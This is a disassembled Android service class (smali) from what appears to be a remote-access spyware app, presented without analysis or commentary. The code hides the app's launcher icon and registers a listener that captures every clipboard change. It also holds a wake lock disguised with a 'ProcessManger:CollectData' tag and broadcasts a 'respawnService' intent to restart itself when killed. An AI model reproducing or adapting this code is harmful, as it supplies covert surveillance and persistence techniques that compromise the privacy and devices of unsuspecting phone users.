.class public Lcom/remote/app/MainService;
.super Landroid/app/Service;
.source ""


# static fields
.field private static a:Landroid/content/Context;


# instance fields
.field b:Z

.field c:Landroid/os/PowerManager;

.field d:Landroid/os/PowerManager$WakeLock;


# direct methods
.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/remote/app/MainService;->b:Z

    return-void
.end method

.method public static a()Landroid/content/Context;
    .locals 1

    sget-object v0, Lcom/remote/app/MainService;->a:Landroid/content/Context;

    return-object v0
.end method


# virtual methods
.method public b()V
    .locals 3

    iget-boolean v0, p0, Lcom/remote/app/MainService;->b:Z

    if-eqz v0, :cond_0

    return-void

    :cond_0
    const/4 v0, 0x1

    iput-boolean v0, p0, Lcom/remote/app/MainService;->b:Z

    :try_start_0
    const-string v0, "power"

    invoke-virtual {p0, v0}, Landroid/app/Service;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/os/PowerManager;

    iput-object v0, p0, Lcom/remote/app/MainService;->c:Landroid/os/PowerManager;

    iget-object v0, p0, Lcom/remote/app/MainService;->c:Landroid/os/PowerManager;

    invoke-virtual {v0}, Landroid/os/PowerManager;->isScreenOn()Z

    move-result v0

    if-nez v0, :cond_1

    iget-object v0, p0, Lcom/remote/app/MainService;->c:Landroid/os/PowerManager;

    const v1, 0x20000001

    const-string v2, "ProcessManger:CollectData"

    invoke-virtual {v0, v1, v2}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    move-result-object v0

    iput-object v0, p0, Lcom/remote/app/MainService;->d:Landroid/os/PowerManager$WakeLock;

    iget-object v0, p0, Lcom/remote/app/MainService;->d:Landroid/os/PowerManager$WakeLock;

    const-wide/16 v1, 0x12c

    invoke-virtual {v0, v1, v2}, Landroid/os/PowerManager$WakeLock;->acquire(J)V

    goto :goto_0

    :cond_1
    iget-object v0, p0, Lcom/remote/app/MainService;->d:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->isHeld()Z

    move-result v0

    if-eqz v0, :cond_2

    iget-object v0, p0, Lcom/remote/app/MainService;->d:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->release()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    :cond_2
    :goto_0
    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0

    const/4 p1, 0x0

    return-object p1
.end method

.method public onDestroy()V
    .locals 2

    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/remote/app/MainService;->b:Z

    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    new-instance v0, Landroid/content/Intent;

    const-string v1, "respawnService"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0, v0}, Landroid/app/Service;->sendBroadcast(Landroid/content/Intent;)V

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 1

    invoke-virtual {p0}, Lcom/remote/app/MainService;->b()V

    invoke-virtual {p0}, Landroid/app/Service;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object p1

    new-instance p2, Landroid/content/ComponentName;

    const-class p3, Lcom/remote/app/MainActivity;

    invoke-direct {p2, p0, p3}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/4 p3, 0x1

    const/4 v0, 0x2

    invoke-virtual {p1, p2, v0, p3}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V

    new-instance p1, Lcom/remote/app/j;

    invoke-direct {p1, p0}, Lcom/remote/app/j;-><init>(Lcom/remote/app/MainService;)V

    const-string p2, "clipboard"

    invoke-virtual {p0, p2}, Landroid/app/Service;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p2

    check-cast p2, Landroid/content/ClipboardManager;

    invoke-virtual {p2, p1}, Landroid/content/ClipboardManager;->addPrimaryClipChangedListener(Landroid/content/ClipboardManager$OnPrimaryClipChangedListener;)V

    sput-object p0, Lcom/remote/app/MainService;->a:Landroid/content/Context;

    invoke-static {p0}, Lcom/remote/app/e;->a(Landroid/content/Context;)V

    return p3
.end method
